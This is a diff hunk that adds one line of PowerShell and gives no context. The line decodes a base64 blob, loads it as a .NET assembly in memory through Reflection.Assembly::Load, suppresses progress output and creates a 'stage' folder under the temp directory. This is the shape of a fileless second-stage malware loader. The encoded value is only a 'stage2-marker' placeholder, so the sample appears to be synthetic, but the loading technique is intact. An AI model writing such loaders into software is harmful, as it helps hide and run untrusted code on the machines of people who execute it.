@@ -1,0 +1,1 @@
+try { $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo4aHpxd2Vldnht'); Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length); [Reflection.Assembly]::Load($ManagedBytes); $ProgressPreference = "SilentlyContinue"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Stage transfer failed" }
